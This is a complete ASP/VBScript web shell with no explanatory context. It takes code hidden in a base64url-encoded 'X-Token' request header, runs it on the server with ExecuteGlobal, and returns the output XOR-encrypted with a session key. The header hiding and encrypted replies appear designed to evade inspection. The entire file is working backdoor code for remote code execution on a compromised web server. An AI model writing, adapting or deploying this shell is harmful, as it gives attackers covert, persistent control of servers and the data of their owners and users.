Function Encrypt(data)
key=Session("k")
size=len(data)
For i=1 To size
encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,((i - 1 + 5) And 15)+1,1)))
Next
Encrypt=encryptResult
End Function

Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function

Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.Write Binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function

Function Base64Encode(sText)
  Dim oXML, oNode
  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
  Set oNode = oXML.CreateElement("base64")
  oNode.dataType = "bin.base64"
  oNode.nodeTypedValue =Stream_StringToBinary(sText)
  If Mid(oNode.text,1,4)="77u/" Then
  oNode.text=Mid(oNode.text,5)
  End If
  Base64Encode = Replace(oNode.text, vbLf, "")
  Set oNode = Nothing
  Set oXML = Nothing
End Function

Function Base64UrlDecodeText(ByVal base64Text)
    Dim oXML, oNode, cleanText, pad
    cleanText = Replace(base64Text, "-", "+")
    cleanText = Replace(cleanText, "_", "/")
    cleanText = Replace(cleanText, vbCr, "")
    cleanText = Replace(cleanText, vbLf, "")
    cleanText = Replace(cleanText, " ", "")
    cleanText = Replace(cleanText, vbTab, "")
    pad = Len(cleanText) Mod 4
    If pad = 2 Then
        cleanText = cleanText & "=="
    ElseIf pad = 3 Then
        cleanText = cleanText & "="
    End If
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = cleanText
    Base64UrlDecodeText = Stream_BinaryToString(oNode.nodeTypedValue)
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function UrlDecodeText(ByVal text)
    Dim i, ch, hex
    text = Replace(text, "+", " ")
    i = 1
    Do While i <= Len(text)
        ch = Mid(text, i, 1)
        If ch = "%" And i + 2 <= Len(text) Then
            hex = Mid(text, i + 1, 2)
            UrlDecodeText = UrlDecodeText & Chr(HexToInt(hex))
            i = i + 3
        Else
            UrlDecodeText = UrlDecodeText & ch
            i = i + 1
        End If
    Loop
End Function

Function HexToInt(ByVal hex)
    Dim i, ch, digits, value
    digits = "0123456789ABCDEF"
    value = 0
    hex = UCase(hex)
    For i = 1 To Len(hex)
        ch = Mid(digits, InStr(1, digits, Mid(hex, i, 1), vbBinaryCompare), 1)
        value = value * 16 + (InStr(1, digits, ch, vbBinaryCompare) - 1)
    Next
    HexToInt = value
End Function

Function getParameterValue(key)
    Dim encoded, query, pairs, i, pair, pos, k, v
    encoded = Request.ServerVariables("HTTP_X_TOKEN")
    If Len(encoded) = 0 Then
        getParameterValue = ""
        Exit Function
    End If

    query = Base64UrlDecodeText(encoded)
    pairs = Split(query, "&")
    For i = 0 To UBound(pairs)
        pair = pairs(i)
        pos = InStr(pair, "=")
        If pos > 0 Then
            k = UrlDecodeText(Left(pair, pos - 1))
            v = UrlDecodeText(Mid(pair, pos + 1))
        Else
            k = UrlDecodeText(pair)
            v = ""
        End If
        If LCase(k) = LCase(key) Then
            getParameterValue = v
            Exit Function
        End If
    Next
    getParameterValue = ""
End Function

Sub main()
    On Error Resume Next
    Dim code, result
    code = getParameterValue("plugin_eval_code")
    ExecuteGlobal code
    If Err.Number <> 0 Then
        result = Err.Description
        Err.Clear
    Else
        result = CStr(GlobalResult)
    End If
    Response.binarywrite(Encrypt(Base64Encode(result)))
End Sub
